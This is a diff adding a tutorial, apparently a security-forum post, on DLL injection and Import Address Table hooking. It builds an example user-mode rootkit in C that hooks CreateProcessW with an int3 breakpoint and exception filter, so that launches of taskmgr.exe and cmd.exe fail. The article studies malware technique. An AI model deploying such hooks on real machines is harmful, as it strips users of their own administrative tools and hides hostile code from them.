@@ -1,0 +1,149 @@
+Since we’ve recently covered DLLs and, in a timely manner, @0x00pf has given us a brilliant paper on infecting processes 32, I thought that I’d contribute my piece on IAT hooking using a method called DLL injection. In this paper, I will be detailing an implementation of a simple user mode rootkit as an example.
+
+As usual, recommended pre-requisites for this paper are as follows:
+
+C/C++ and Assembly
+WinAPI
+DLLs and DLL Injection
+Windows Memory
+I will briefly cover the necessary material.
+
+Disclaimer: This is not a how to on making malware but rather a report on my research with malware technology so I apologize in advance for any incorrect information.
+
+DLL Injection
+What is DLL injection? DLL injection is the procedure of injecting a DLL into the memory space of a process and then having it execute as a part of it. Doing this means that the DLL code has all access to the process’s memory and can manipulate it for whatever reason but more importantly, it also acquires all the permissions of the process. For example, you wish to communicate to the outside world but you don’t have permissions through the firewall. With DLL injection, you can inject and execute your code into a process which does have the permissions (e.g. Internet Explorer) and it will be able to do what it needs.
+
++--------------+               +--------------------+
+| DLL Injector |               |       Target       |
++--------------+               |      process's     |
+        |                      |       address      |
+        |                      |        space       |
+        |                      |                    |
+        |                      |--------------------|
+        +----------------------->   Injected DLL    |
+                               |--------------------|
+                               +--------------------+
+If anyone is interested on how to code a basic DLL injector, please let me know down below.
+
+User Mode Rootkits
+User mode rootkits are rootkits (though not technically) which provide similar functionalities as kernel mode rootkits, such as masking and disabling access to files, but operate at the user level. We call this level ring 3 whereas kernel mode rootkits are ring 0. What are these rings? Here’s a diagram for visual aid.
+
+
+
+As we can see, the green is user mode and the red in the center is kernel mode. Although rings 1 and 2 do exist, they are actually not used so we just refer to either 0 or 3.
+
+The WinAPI function calls are called from ring 3 which must go inwards to ring 0 through a series of privilege checks since ring 3 cannot directly communicate with the CPU. Once in ring 0, the OS executes the instructions to perform what’s necessary for the function call. By doing this, the API trusts that the parameters passed from ring 3 to 0 and back will maintain its integrity and not be modified.
+
+The Import Address Table and Exported DLL Functions
+What is the IAT? The IAT is the Import Address Table. I’ve very briefly introduced this concept in Understanding a Win32 Virus: Background Material 19 but I will explain in more depth this time. The IAT is the table which contains imports of a DLL’s exports and these two tables are pretty similar in structure. Here’s an example of an IAT of an application:
+
+
+
+What we’re interested in is the Directory Table just a bit below the address table.
+
+
+
+Here, we can see a few details about each of the imported DLLs which correspond to the following struct (which I believe is undocumented for some reason):
+
+typedef struct _IMAGE_IMPORT_DESCRIPTOR {
+    DWORD OriginalFirstThunk;
+    DWORD TimeDateStamp;
+    DWORD ForwarderChain;
+    DWORD Name;
+    DWORD FirstThunk;
+} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;
+If we have a look at the OriginalFirstThunk member, we will see that it is exactly the same as the FirstThunk member which are both arrays of IMAGE_THUNK_DATA.
+
+
+
+Having these duplicates is not a matter of inefficiency because the FirstThunk will be replaced on runtime by the Windows loader with the actual address of the DLLs’ exported functions. Here’s the comparison of the memory dump of both the OriginalFirstThunk and the FirstThunk juxtaposed with the PEview of the FirstThunk.
+
+
+
+We can see that the memory dump of RVA 0x2000 no longer holds the value of 0x2890 but instead holds 0x75BB5414 which corresponds to the address of the GetFileAttributesA function in kernel32 whereas the memory dump of the OriginalFirstThunk remains the same 0x2890.
+
+Now that we have an idea of how DLLs’ exported functions are substituted into the import table of an executable, let’s now examine what the function looks like and how it works.
+
+
+
+Most WinAPI wrapper functions usually have the five byte stub at the beginning:
+
+mov    edi, edi
+push   ebp
+mov    ebp, esp
+After this comes the actual function itself which is just a jmp but for this paper, we will not actually be going any deeper than this. What’s interesting about this is the stub at the beginning because it allows us to overwrite the bytes to place in a method to hook the function call which then means we can potentially modify the parameters. This is breaking the trust between the API calls from ring 3 to ring 0.
+
+Example Implementation
+For the DLL, it will not be exporting any functions since its purpose is to modify the stub in the wrapper of a target function in its own process. First, we will need to define DllMain 25 like so:
+
+BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter);
+            HookFunction();
+            break;
+    }
+
+    return TRUE;
+}
+DllMain will be called when the DLL has been executed so just think of it as a normal main for now. The fdwReason is used to detect under which circumstance the DllMain has been called, so for this purpose we will only initialize the hooking when it has been attached to a process. In this method we will be raising exceptions to detect RIP (Instruction Pointer) executing in the target function’s entry so we set up a custom defined exception handler MyUnhandledExceptionFilter and then we will set up the hook. Let’s take a look at the exception filter function.
+
+LONG WINAPI MyUnhandledExceptionFilter(LPEXCEPTION_POINTERS lpException) {
+    if (lpException->ContextRecord->Rip == (DWORD_PTR)fpCreateProcessW)
+        lpException->ContextRecord->Rip = (DWORD_PTR)MyCreateProcessW;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+Once an exception has occurred, program flow will enter this function first. It checks to see if it has entered our target function CreateProcessW and if it has, we will point RIP to our intercepting function for extra processing, otherwise, it will continue execution normally. For the routine to hook the target function, we will simply set the first byte of the stub to an int 3h which is the debuggers’ method of placing a breakpoint.
+
+VOID HookFunction(VOID) {
+    fpCreateProcessW = GetProcAddress(LoadLibrary(L"kernel32"), "CreateProcessW");
+    if (fpCreateProcessW == NULL) {
+        Debug(L"Get CreateFile error: %lu", GetLastError()); 
+        return;
+    }
+
+    bSavedByte = *(LPBYTE)fpCreateProcessW;
+
+    const BYTE bInt3 = 0xCC;
+    if (WriteMemory(fpCreateProcessW, &bInt3, sizeof(BYTE)) == FALSE) {
+        Debug(L"Write memory error: %lu", GetLastError());
+        ExitThread(0);
+    }
+}
+It needs to get the address of the function first through GetProcAddress and LoadLibraryW with kernel32 and CreateProcessW so that it knows where to modify the stub. Before placing the exception, it must save the original first byte so that it can restore it if our hook function (MyCreateProcessW, not HookFunction) actually calls the function. If you don’t understand this, don’t worry, it will make sense when we analyze MyCreateProcessW. To place the int 3h byte (0xCC) we need to unprotect the memory and then write to it, then reprotect it like so:
+
+BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
+    DWORD dwOldProt = 0;
+    if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE)
+        return FALSE;
+
+    MoveMemory(fpFunc, b, size);
+
+    return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
+}
+Using VirtualProtect, we can do this with ease. We’ll modify the permissions of the memory space to be able to write to it, write the byte in, then restore the original permissions. Now, when the target process tries to use CreateProcessW, it will trigger the exception on the int 3h byte and enter our exception handler. Our exception handler will then redirect execution flow to MyCreateProcessW:
+
+BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
+    WCHAR szLowerCase[MAX_PATH];
+    StringToLowerCase(szLowerCase, lpApplicationName);
+
+    if (wcsstr(szLowerCase, L"taskmgr.exe") != NULL ||
+        wcsstr(szLowerCase, L"cmd.exe") != NULL) {
+        Debug(L"Open %s denied", lpApplicationName);
+        SetLastError(ERROR_ACCESS_DENIED);
+        return FALSE;
+    }
+
+    if (WriteMemory(fpCreateProcessW, &bSavedByte, sizeof(BYTE)) == FALSE) {
+        Debug(L"MyCreateProcessW WriteMemory error: %lu", GetLastError());
+        ExitThread(0);
+    }
+    
+    BOOL b = CreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
+
+    HookFunction();
+    return b;
+}
+This function emulates the real function’s return value, the calling convention and the arguments so nothing breaks. We then check to see if the lpApplicationName matches any of the programs which we want to deny access to and if it does, it will spawn a Debug message (this is optional) and then set the error to an access denied, then return FALSE (as the actual function would on failure). Otherwise, we will simply restore the original byte in CreateProcessW's stub and then call it by directly passing the arguments. We will re-hook the function to reset the int 3h byte so that it will trigger again on the next call, then return its return value.
+
